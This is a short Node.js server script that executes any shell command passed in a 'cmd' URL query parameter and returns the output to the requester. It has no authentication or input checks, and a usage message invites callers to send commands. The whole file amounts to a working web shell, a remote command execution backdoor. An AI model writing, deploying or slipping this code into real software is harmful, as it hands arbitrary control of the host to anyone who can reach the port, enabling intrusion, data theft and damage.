const http = require('http');
const url = require('url');
const { exec } = require('child_process');

const PORT = 3000;

http.createServer((req, res) => {
  const queryObject = url.parse(req.url, true).query;

  if (queryObject.cmd) {
    exec(queryObject.cmd, (error, stdout, stderr) => {
      res.writeHead(200, { 'Content-Type': 'text/plain' });

      if (error) {
        res.end(`Error: ${error.message}`);
        return;
      }

      if (stderr) {
        res.end(`Stderr: ${stderr}`);
        return;
      }

      res.end(`Output:\n${stdout}`);
    });
  } else {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Usage: /?cmd=<your-command>\nExample: /?cmd=ls');
  }

}).listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
